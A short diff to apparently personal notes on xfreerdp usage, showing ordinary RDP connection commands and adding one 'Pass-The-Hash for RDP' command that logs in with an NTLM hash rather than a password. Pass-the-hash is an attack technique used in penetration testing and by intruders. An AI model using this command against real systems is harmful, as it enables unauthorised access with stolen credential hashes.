@@ -15,6 +15,10 @@ xfreerdp  /u:"DOMAINNAME\joe" /v:192.168.101.20:3389 /f +clipboard
 or
 xfreerdp  /u:joe /d:DOMAINNAME /v:192.168.101.20:3389 /f +clipboard
 
+# Pass-The-Hash for RDP
+xfreerdp  /u:"DOMAINNAME\joe"  /pth:8373defaasde29180afc821219fba799dc /v:192.168.101.20:3389 /f +clipboard
+
+
 
 ## Other flags
 https://github.com/FreeRDP/FreeRDP/wiki/CommandLineInterface
